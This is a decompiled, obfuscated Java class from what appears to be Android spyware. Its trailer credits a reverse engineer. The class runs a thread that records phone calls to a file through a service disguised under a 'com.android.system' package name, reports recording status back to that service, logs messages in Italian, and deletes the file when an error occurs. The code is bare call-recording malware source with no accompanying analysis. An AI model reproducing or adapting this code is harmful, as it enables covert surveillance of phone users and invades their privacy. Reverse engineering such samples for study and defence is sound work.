package com.a.a;

import android.content.Context;
import android.content.Intent;
import com.android.system.RecordCallService;
import com.android.system.RecordCallService.RestartRecReceiver;
import com.app.system.common.entity.RecStatus.Status;
import java.io.File;

public class b
  extends Thread
  implements a.a
{
  private Context a;
  private File b;
  private int c;
  
  public b(Context paramContext, String paramString, int paramInt)
  {
    this.a = paramContext;
    this.b = new File(paramString);
    this.c = paramInt;
    a.a().a(this);
  }
  
  private void a(String paramString)
  {
    a(paramString, null);
  }
  
  private void a(String paramString1, String paramString2)
  {
    Intent localIntent = new Intent(this.a, RecordCallService.class);
    localIntent.putExtra("data", "GIVE_FEEDBACK");
    localIntent.putExtra("FEEDBACK_STATUS", paramString1);
    if ((paramString2 != null) && (!paramString2.isEmpty())) {
      localIntent.putExtra("FEEDBACK_MSG", paramString2);
    }
    this.a.startService(localIntent);
  }
  
  private void c()
  {
    a.a().a(1, 3, 1, 16000, 32768, this.b);
  }
  
  private void d()
  {
    if (b()) {
      a.a().b();
    }
  }
  
  public void a()
  {
    d();
  }
  
  public void a(int paramInt, String paramString)
  {
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    switch (paramInt)
    {
    default: 
      paramString = str;
      break;
    case 3: 
      paramString = new StringBuilder();
      paramString.append(str);
      paramString.append(" (ERROR_NOT_PREPARED)");
      paramString = paramString.toString();
      break;
    case 2: 
      paramString = new StringBuilder();
      paramString.append(str);
      paramString.append(" (ERROR_INTERNAL)");
      paramString = paramString.toString();
      break;
    case 1: 
      paramString = new StringBuilder();
      paramString.append(str);
      paramString.append(" (ERROR_SDCARD_ACCESS)");
      paramString = paramString.toString();
    }
    a(RecStatus.Status.FAILED.name(), paramString);
    RecordCallService.RestartRecReceiver.a(this.a);
    try
    {
      this.b.delete();
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public boolean b()
  {
    return a.a().c();
  }
  
  public void run()
  {
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append("Avvio thread registrazione dir=");
    localStringBuilder.append(this.c);
    localStringBuilder.append(" file=");
    localStringBuilder.append(this.b);
    com.security.d.a.d("CallRecorder", localStringBuilder.toString(), new Object[0]);
    a(RecStatus.Status.STARTING.name());
    c();
    a(RecStatus.Status.RECORDING.name());
  }
}


/* Location:              ~/com/a/a/b.class
 *
 * Reversed by:           J
 */